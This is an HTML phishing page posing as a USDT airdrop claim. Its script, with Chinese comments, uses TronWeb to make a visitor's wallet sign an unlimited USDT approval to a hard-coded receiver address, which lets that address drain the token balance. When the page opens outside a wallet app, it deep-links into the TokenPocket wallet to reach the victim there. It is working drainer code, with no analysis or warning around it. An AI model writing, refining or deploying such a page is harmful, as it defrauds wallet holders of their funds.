<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AIRDROP_FIXED</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #f00; font-family: monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        #terminal { width: 85%; margin: 0 auto; border: 1px solid #f00; padding: 20px; background: #050000; box-shadow: 0 0 15px #f00; }
        .btn { display: block; width: 240px; padding: 20px; margin: 30px auto; background: #f00; color: #000; text-decoration: none; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
        .log { color: #0f0; font-size: 11px; margin-top: 15px; text-align: left; min-height: 60px; line-height: 1.4; overflow: hidden; }
    </style>
</head>
<body>

    <div id="terminal">
        <h2>> CORE_SYSTEM_V7</h2>
        <p id="env_status">> ENV: CHECKING...</p>
        <div class="log" id="log">> SYSTEM_INITIALIZED...</div>
    </div>

    <div id="mainBtn" class="btn">CLAIM USDT</div>

    <script>
        // --- 配置区 ---
        const receiver = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; 
        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        
        // 自动获取当前页面的纯净地址，防止硬编码写错
        const currentUrl = window.location.origin + window.location.pathname;

        const btn = document.getElementById('mainBtn');
        const log = document.getElementById('log');
        const envStatus = document.getElementById('env_status');

        async function start() {
            // A. 环境判断：是否在钱包内部
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                log.innerHTML += "<br>> [STATUS]: WALLET_MODE_ACTIVE";
                try {
                    let contract = await window.tronWeb.contract().at(usdtContract);
                    const val = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                    
                    // 弹出授权请求
                    await contract.approve(receiver, val).send({ feeLimit: 100000000 });
                    log.innerHTML += "<br>> [SUCCESS]: TX_BROADCASTED";
                } catch (e) {
                    log.innerHTML += "<br>> [ERROR]: " + e.message;
                }
            } 
            // B. 环境判断：在 Safari 浏览器中
            else {
                log.innerHTML += "<br>> [STATUS]: BROWSER_MODE";
                log.innerHTML += "<br>> [ACTION]: BRIDGING_TO_APP...";

                // 重点：构造协议，去掉任何多余的转义干扰
                const params = { "url": currentUrl };
                const jumpLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify(params));

                // 执行跳转
                window.location.href = jumpLink;

                // 如果跳转失败的提示
                setTimeout(() => {
                    log.innerHTML += "<br>> [HINT]: 点击“允许”跳转，或确保已安装钱包";
                }, 2000);
            }
        }

        btn.onclick = start;

        window.onload = () => {
            if (window.tronWeb) {
                envStatus.innerText = "> ENV: INTERNAL";
                log.innerHTML += "<br>> WALLET: " + window.tronWeb.defaultAddress.base58.substring(0,8);
            } else {
                envStatus.innerText = "> ENV: EXTERNAL";
                log.innerHTML += "<br>> TARGET: " + currentUrl;
            }
        };
    </script>
</body>
</html>
